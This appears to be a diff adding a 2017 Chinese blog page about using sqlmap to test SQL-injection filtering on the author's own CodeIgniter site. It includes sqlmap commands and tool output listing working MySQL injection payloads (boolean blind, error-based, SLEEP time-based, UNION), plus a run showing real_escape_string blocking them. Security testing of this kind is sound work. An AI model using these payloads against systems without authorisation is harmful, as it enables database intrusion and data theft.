@@ -1,0 +1,720 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next mist" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="MySQL," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="缘由今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。主要测试内容：
+
+直接用select * from table where id={$id}看sqlmap工具效果
+使用real_escape_string过滤测试效果
+使用php的addslashes方法测试效果
+
+下载
+http://sqlmap.org/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap使用心得">
+<meta property="og:url" content="http://wufazuce.com/2017/01/13/sqlmap使用心得/index.html">
+<meta property="og:site_name" content="yinn小站">
+<meta property="og:description" content="缘由今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。主要测试内容：
+
+直接用select * from table where id={$id}看sqlmap工具效果
+使用real_escape_string过滤测试效果
+使用php的addslashes方法测试效果
+
+下载
+http://sqlmap.org/">
+<meta property="og:updated_time" content="2017-01-13T16:20:48.876Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqlmap使用心得">
+<meta name="twitter:description" content="缘由今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。主要测试内容：
+
+直接用select * from table where id={$id}看sqlmap工具效果
+使用real_escape_string过滤测试效果
+使用php的addslashes方法测试效果
+
+下载
+http://sqlmap.org/">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '6373086759810500000',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://wufazuce.com/2017/01/13/sqlmap使用心得/"/>
+
+
+
+
+
+  <title> sqlmap使用心得 | yinn小站 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">yinn小站</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+<link itemprop="mainEntityOfPage" href="http://wufazuce.com/2017/01/13/sqlmap使用心得/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="yinn">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="yinn小站">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="yinn小站" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                sqlmap使用心得
+              
+            
+          </h1>
+        
+
+
+        <div class="post-meta">
+
+
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-13T18:44:31+08:00">
+                2017-01-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。<br>主要测试内容：</p>
+<ul>
+<li>直接用<code>select * from table where id={$id}</code>看sqlmap工具效果</li>
+<li>使用<code>real_escape_string</code>过滤测试效果</li>
+<li>使用php的<code>addslashes</code>方法测试效果</li>
+</ul>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><blockquote>
+<p><a href="http://sqlmap.org/" target="_blank" rel="external">http://sqlmap.org/</a></p>
+</blockquote>
+<hr>
+<p>sqlmp参数说明，直接<code>sqlmap.py -h</code>看介绍。</p>
+<ul>
+<li>–dbms 指定数据库</li>
+<li>–level=LEVEL</li>
+</ul>
+<h2 id="模拟有sql注入的情况"><a href="#模拟有sql注入的情况" class="headerlink" title="模拟有sql注入的情况"></a>模拟有sql注入的情况</h2><p>测试接口：</p>
+<blockquote>
+<p>./sqlmap.py -u “<a href="http://wufazuce.com/index.php?time=1">http://wufazuce.com/index.php?time=1</a>“</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">sqlmap identified the following injection point(s) with a total of 188 HTTP(s) requests:</div><div class="line">---</div><div class="line">Parameter: time (GET)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</div><div class="line">    Payload: time=1 OR NOT 5138=5138#</div><div class="line"></div><div class="line">    Type: error-based</div><div class="line">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</div><div class="line">    Payload: time=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6271,(SELECT (ELT(3637=3637,1))),0x7178787a71,0x78))s), 8446744073709551610, 8446744073709551610)))</div><div class="line"></div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind</div><div class="line">    Payload: time=1 OR SLEEP(5)</div><div class="line"></div><div class="line">    Type: UNION query</div><div class="line">    Title: Generic UNION query (NULL) - 4 columns</div><div class="line">    Payload: time=1 UNION ALL SELECT CONCAT(0x71626a6271,0x457a6c736b4d50776b6b64726471774444456b72447559596f6f684c6b68434b62736d4f7154656b,0x7178787a71),NULL,NULL,NULL-- DBwe</div><div class="line">---</div><div class="line">web application technology: PHP 5.6.22</div><div class="line">back-end DBMS: MySQL &gt;= 5.5</div></pre></td></tr></table></figure>
+<h2 id="使用real-escape-string过滤测试效果"><a href="#使用real-escape-string过滤测试效果" class="headerlink" title="使用real_escape_string过滤测试效果"></a>使用<code>real_escape_string</code>过滤测试效果</h2><p>php中<code>real_escape_string</code>可以过滤防范。</p>
+<blockquote>
+<p>/sqlmap.py -u “<a href="http://wufazuce.com/finc/perform/trend?time=1">http://wufazuce.com/finc/perform/trend?time=1</a>“  –level=5 –dbms=mysql</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">[18:01:18] [INFO] testing connection to the target URL</div><div class="line">[18:01:18] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</div><div class="line">[18:01:18] [INFO] testing if the target URL is stable</div><div class="line">[18:01:19] [INFO] target URL is stable</div><div class="line">[18:01:19] [INFO] testing if GET parameter &apos;time&apos; is dynamic</div><div class="line">[18:01:19] [INFO] confirming that GET parameter &apos;time&apos; is dynamic</div><div class="line">[18:01:19] [INFO] GET parameter &apos;time&apos; is dynamic</div><div class="line">[18:01:19] [WARNING] reflective value(s) found and filtering out</div><div class="line">[18:01:19] [INFO] heuristic (basic) test shows that GET parameter &apos;time&apos; might be injectable</div><div class="line">[18:01:19] [INFO] testing for SQL injection on GET parameter &apos;time&apos;</div><div class="line">[18:01:19] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</div><div class="line">[18:01:20] [INFO] testing &apos;MySQL &gt;= 5.0 boolean-based blind - Parameter replace&apos;</div><div class="line">[18:01:20] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&apos;</div><div class="line">[18:01:20] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos;</div><div class="line">[18:01:20] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&apos;</div><div class="line">[18:01:20] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;MySQL inline queries&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;PostgreSQL inline queries&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;Microsoft SQL Server/Sybase inline queries&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;PostgreSQL &gt; 8.1 stacked queries (comment)&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;Microsoft SQL Server/Sybase stacked queries (comment)&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&apos;</div><div class="line">[18:01:21] [INFO] testing &apos;MySQL &gt;= 5.0.12 AND time-based blind&apos;</div><div class="line">[18:01:22] [INFO] testing &apos;PostgreSQL &gt; 8.1 AND time-based blind&apos;</div><div class="line">[18:01:22] [INFO] testing &apos;Microsoft SQL Server/Sybase time-based blind (IF)&apos;</div><div class="line">[18:01:22] [INFO] testing &apos;Oracle AND time-based blind&apos;</div><div class="line">[18:01:22] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 10 columns&apos;</div><div class="line">[18:01:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option &apos;--dbms&apos;</div><div class="line">[18:01:25] [WARNING] GET parameter &apos;time&apos; does not seem to be injectable</div><div class="line">[18:01:25] [CRITICAL] all tested parameters appear to be not injectable. Try to increase &apos;--level&apos;/&apos;--risk&apos; values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option &apos;--string&apos; (or &apos;--regexp&apos;). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option &apos;--tamper&apos; (e.g. &apos;--tamper=space2comment&apos;)</div></pre></td></tr></table></figure>
+<h2 id="使用php的addslashes方法测试效果"><a href="#使用php的addslashes方法测试效果" class="headerlink" title="使用php的addslashes方法测试效果"></a>使用php的<code>addslashes</code>方法测试效果</h2><p><code>addslashes</code>方法前后不会自动加单引号<code>&#39;&#39;</code></p>
+<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>工具很强大，自己只用了点皮毛，后面有时间再深入研究。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>Web安全之SQL注入攻击技巧与防范(<a href="http://www.plhwin.com/2014/06/13/web-security-sql/" target="_blank" rel="external">http://www.plhwin.com/2014/06/13/web-security-sql/</a>)</li>
+<li>是否足够安全<a href="http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string" target="_blank" rel="external">http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MySQL/" rel="tag"># MySQL</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/01/11/C实践小程序-原子和非原子-操作/" rel="next" title="C实践小程序-原子和非原子++操作">
+                <i class="fa fa-chevron-left"></i> C实践小程序-原子和非原子++操作
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="yinn" />
+          <p class="site-author-name" itemprop="name">yinn</p>
+          <p class="site-description motion-element" itemprop="description">取悦自己</p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#缘由"><span class="nav-number">1.</span> <span class="nav-text">缘由</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下载"><span class="nav-number">2.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模拟有sql注入的情况"><span class="nav-number">3.</span> <span class="nav-text">模拟有sql注入的情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用real-escape-string过滤测试效果"><span class="nav-number">4.</span> <span class="nav-text">使用real_escape_string过滤测试效果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用php的addslashes方法测试效果"><span class="nav-number">5.</span> <span class="nav-text">使用php的addslashes方法测试效果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#感受"><span class="nav-number">6.</span> <span class="nav-text">感受</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">7.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yinn</span>
+</div>
+<div>
+<a href="http://www.miitbeian.gov.cn/">粤ICP备16122416号</a> 
+</div>
+
+
+        
+
+<div class="busuanzi-count">
+
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user"></i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye"></i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span>
+  
+  
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
